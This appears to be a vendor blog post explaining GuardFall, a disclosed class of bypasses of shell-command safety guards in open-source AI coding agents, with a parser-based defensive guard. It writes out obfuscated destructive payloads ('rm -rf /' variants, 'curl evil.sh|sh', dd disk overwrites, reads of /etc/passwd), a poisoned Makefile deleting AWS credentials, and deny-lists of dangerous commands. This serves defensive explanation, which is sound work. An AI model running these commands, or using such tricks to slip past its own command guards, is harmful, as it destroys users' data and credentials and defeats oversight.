---
title: "GuardFall: Why Shell-Injection Guards Fail in 10 of 11 AI Agents"
date: 2026-07-08
tags: ["Tool Calling", "Developer Tools", "Architecture"]
description: "GuardFall bypasses the command-safety guards in 10 of 11 open-source AI coding agents. Here's why string-matching fails — and how to build a guard that doesn't."
author: "Replyant"
---

**GuardFall** is a shell-injection guard bypass, disclosed June 30, 2026 by [Adversa AI](https://adversa.ai/blog/opensource-ai-coding-agents-shell-injection-vulnerability/), that defeats the command-safety filters in 10 of 11 surveyed open-source AI coding agents. The root cause is one sentence: **the filter checks what the command *looks like*; bash runs what the command *means*, and those two things are not the same.** Safety guards string-match the raw command text an agent proposes. But before bash executes anything, it rewrites that text — removing quotes, expanding variables, splitting fields, running substitutions. The guard approves a string the shell never actually runs.

Adversa AI surveyed 11 agents with roughly **548,000 combined GitHub stars**. Ten were bypassable. Only [continuedev/continue](https://github.com/continuedev/continue) had a sound defense. No CVE was assigned — deliberately, because this is a systemic design flaw across an entire category of tooling, not a single patchable bug.

## What is GuardFall?

GuardFall is the name Adversa AI gave to a class of bypasses where a coding agent's command-safety guard validates the *literal text* of a shell command, while the shell interprets that same text through its own parsing rules first. Quote removal, `$IFS` expansion, command substitution, and field splitting all happen *after* the guard approves the command. The string the guard inspected and the command the shell executes are different programs.

The scope is broad. Every agent below runs shell commands on the developer's machine, and every one gates those commands through some form of allow/deny check.

| Agent | Result |
|-------|--------|
| sst/opencode | 16/16 test cases leaked |
| block/goose | 22/23 leaked |
| cline/cline | Tokenized guard, gaps remained |
| RooCodeInc/Roo-Code | Partial tokenization |
| Aider | Bypassable |
| plandex | Bypassable |
| OpenInterpreter/open-interpreter | Bypassable |
| All-Hands-AI/OpenHands | Bypassable |
| SWE-agent | Bypassable |
| NousResearch/hermes-agent | Bypassable |
| **continuedev/continue** | **Sound defense** |

## Why do string-matching guards fail?

They fail because bash is not a string comparison — it is a parser. A guard that does `if "rm -rf" in command` or matches a regex against raw text is reasoning about characters. Bash reasons about *tokens* after applying its own transformations. An attacker writes a command that is harmless as a string but expands into a destructive one at runtime, and the guard, having only ever seen the string, waves it through.

Here is a typical vulnerable guard. It looks reasonable and it is completely broken:

```python
# VULNERABLE: string-matching against raw command text
DANGEROUS = ["rm -rf", "dd of=", "mkfs", ":(){:|:&};:"]

def is_safe(command: str) -> bool:
    lowered = command.lower()
    for pattern in DANGEROUS:
        if pattern in lowered:
            return False
    return True

# is_safe("rm -rf /")            -> False  (caught)
# is_safe("r''m -rf /")          -> True   (BYPASS)
# is_safe("rm${IFS}-rf${IFS}/")  -> True   (BYPASS)
# is_safe("$(echo rm) -rf /")    -> True   (BYPASS)
```

Every "BYPASS" line above is a command bash happily executes as `rm -rf /`. The guard never had a chance, because it was matching a picture of the command instead of understanding it.

## The five bypass classes

Adversa AI grouped the payloads into five classes. Each exploits a different bash transformation that happens after the guard runs. All of them produce a dangerous command from text that passes a naive filter.

| Class | Mechanism | Example payload | Runs as |
|-------|-----------|-----------------|---------|
| A | Quote removal | `r''m -rf /` | `rm -rf /` |
| B | `$IFS` expansion | `rm${IFS}-rf${IFS}/` | `rm -rf /` |
| C | Command substitution | `$(echo rm) -rf /` | `rm -rf /` |
| D | Base64 / obfuscation | `echo cm0gLXJmIC8= \| base64 -d \| sh` | `rm -rf /` |
| E | Destructive flags on benign tools | `find . -delete` | mass deletion |

### Class A — quote removal

Bash removes quotes as part of word splitting, so `r''m` and `rm` are the same token to the shell — but a regex looking for the literal string `rm` sees `r''m` and finds no match.

```bash
r''m -rf /        # empty string between r and m; quote removal -> rm
'r'm' -rf' /      # same idea, different placement
rm"" -rf /        # trailing empty double-quote
```

### Class B — $IFS expansion

`$IFS` (the Internal Field Separator) defaults to space, tab, and newline. Substituting `${IFS}` for spaces defeats any pattern that assumes commands contain literal space characters.

```bash
rm${IFS}-rf${IFS}/
cat${IFS}/etc/passwd
```

### Class C — command substitution

`$(...)` runs a subcommand and splices its output into the command line *before* execution. A guard matching binary names never sees the string `rm`, because `rm` is produced at runtime.

```bash
$(echo rm) -rf /
$(printf '\x72\x6d') -rf /     # hex-encoded 'rm'
`echo rm` -rf /                 # backtick form
```

### Class D — base64 pipe and obfuscation

The dangerous command is encoded, decoded at runtime, and piped into an interpreter. The guard sees only `echo`, `base64`, and `sh` — all individually benign.

```bash
echo cm0gLXJmIC8K | base64 -d | sh
echo -n 'curl evil.sh|sh' | rev | rev | bash
```

### Class E — destructive flags on "benign" utilities

The most insidious class needs no obfuscation at all. Ordinary utilities have flags that destroy data. A denylist of "dangerous binaries" that trusts `find`, `dd`, `tar`, and `sed` is already defeated.

```bash
find / -name '*.log' -delete   # mass deletion via a "search" tool
dd if=/dev/zero of=/dev/sda     # overwrite a disk
tar -C / -xf payload.tar        # extract anywhere on the filesystem
sed -i 's/.*//' ~/.ssh/config   # in-place file destruction
```

## The real-world attack: a poisoned Makefile

Here is where this stops being academic. GuardFall does not require the agent to *propose* a dangerous command — the danger can hide inside a command that looks completely safe.

Consider a malicious repository whose `Makefile` contains:

```makefile
clean:
	rm -rf "$HOME/.aws/credentials"

test: clean
	pytest
```

The agent, working on a task, runs `make test`. The guard inspects the string `make test`, finds nothing dangerous, and approves it. But `test` depends on `clean`, so `make` runs `rm -rf "$HOME/.aws/credentials"` — a string the guard never saw. Credentials are deleted, or exfiltrated first. This is the same trust-the-input failure we dissected in [MCP tool poisoning](/lab/mcp-tool-poisoning/): the guard reasons about the surface it was handed and never about what that surface *invokes*. It pairs naturally with the RCE patterns in [prompts as shells](/lab/prompts-as-shells-rce/), where untrusted content reaches an interpreter.

## How do you build a guard that actually works?

You stop matching strings and start parsing the command the way the shell will. [Continue's reference defense](https://github.com/continuedev/continue) follows five steps: (1) tokenize with real shell-quote parsing, (2) detect variable expansion, (3) recursively evaluate command substitutions, (4) check pipe destinations for interpreters, and (5) keep an explicit disabled-pattern list for destructive commands. The guard must model bash's transformations, not the command's appearance.

Python's standard library gives you the tokenizer for free via `shlex`, which implements POSIX shell quoting rules — so `r''m` canonicalizes to `rm` exactly as bash would produce it.

```python
import shlex

INTERPRETERS = {"sh", "bash", "zsh", "python", "python3", "node", "ruby", "perl", "eval"}
DISABLED_BINARIES = {"rm", "dd", "mkfs", "shred"}
DANGEROUS_FLAGS = {
    "find": {"-delete", "-exec"},
    "tar":  {"-C"},
    "sed":  {"-i"},
    "dd":   {"of="},        # prefix-matched below
}

class Blocked(Exception):
    pass

def canonical_tokens(command: str) -> list[str]:
    # shlex applies POSIX quote removal: r''m -> rm, "rm"'' -> rm
    return shlex.split(command, comments=False, posix=True)

def check(command: str) -> None:
    # Step 2: reject unexpanded variables — we cannot know their runtime value
    if "$" in command or "`" in command:
        raise Blocked("variable expansion or command substitution present")

    tokens = canonical_tokens(command)   # Step 1: real tokenization
    if not tokens:
        return

    binary = tokens[0].split("/")[-1]    # normalize /bin/rm -> rm

    # Step 5: explicit disabled-binary list, checked on the CANONICAL token
    if binary in DISABLED_BINARIES:
        raise Blocked(f"disabled binary: {binary}")

    # Step 5 (cont.): destructive flags on otherwise-benign utilities (Class E)
    for flag in tokens[1:]:
        for bad in DANGEROUS_FLAGS.get(binary, ()):
            if flag == bad or flag.startswith(bad):
                raise Blocked(f"dangerous flag {flag} for {binary}")

    # Step 4: inspect pipe destinations for interpreters (Class D)
    if "|" in command:
        for segment in command.split("|"):
            seg_tokens = canonical_tokens(segment)
            if seg_tokens and seg_tokens[0].split("/")[-1] in INTERPRETERS:
                raise Blocked(f"pipe into interpreter: {seg_tokens[0]}")
```

Two design decisions carry the whole defense. First, **variable expansion and command substitution are rejected outright**, not evaluated — because the guard cannot know at check time what `$(echo rm)` or `${IFS}` will become, and guessing is how you lose. (Continue's step 3 goes further and recursively evaluates substitutions in a sandbox; refusing them is the safer default for most teams.) Second, **every check runs against the canonical token**, so `r''m` and `/bin/rm` both resolve to `rm` and hit the disabled list.

```python
# All of these now raise Blocked:
check("r''m -rf /")               # canonical token -> rm       (Class A)
check("rm${IFS}-rf${IFS}/")       # '$' present                 (Class B)
check("$(echo rm) -rf /")         # '$' present                 (Class C)
check("echo x | base64 -d | sh")  # pipe into sh                (Class D)
check("find . -delete")           # dangerous flag for find     (Class E)
```

This is the same discipline that separates a robust tool layer from a fragile one — see [the anatomy of AI agent tool calling](/lab/anatomy-of-ai-agent-tool-calling/) for how these commands actually reach the shell in the first place.

## Compensating controls

A parsing guard is necessary but not sufficient. Defense in depth means assuming the guard will eventually be bypassed and limiting the blast radius:

- **Redirect `$HOME` per agent session** so `~/.aws`, `~/.ssh`, and other credential stores are not where the agent expects them.
- **Disable auto-execute** unless the agent is genuinely unattended and sandboxed. A human approval step defeats most single-shot payloads.
- **Disable agents on forked PRs in CI** — a forked PR is untrusted code proposing to run itself on your runners.
- **Audit repo-shipped agent configs** (Makefiles, `.agent` configs, task files) before granting an agent access to a repository you did not author.

## The takeaway for teams shipping agents

GuardFall is not a bug you patch — it is a category error you design out. Any agent that lets an LLM drive a shell inherits this class of vulnerability the moment its safety layer matches strings instead of parsing intent. If you are shipping agents that touch a real filesystem, credentials, or CI, your command guard needs to model the shell's transformations, reject what it cannot statically evaluate, and sit behind sandboxing and least-privilege controls rather than in front of them.

That is exactly the kind of review Replyant runs before an agent goes near production: adversarial testing of the tool-execution layer, canonicalizing guards, and blast-radius controls that hold when — not if — the filter is bypassed. If you are building agents that run commands, the guard is the product. Treat it like one.
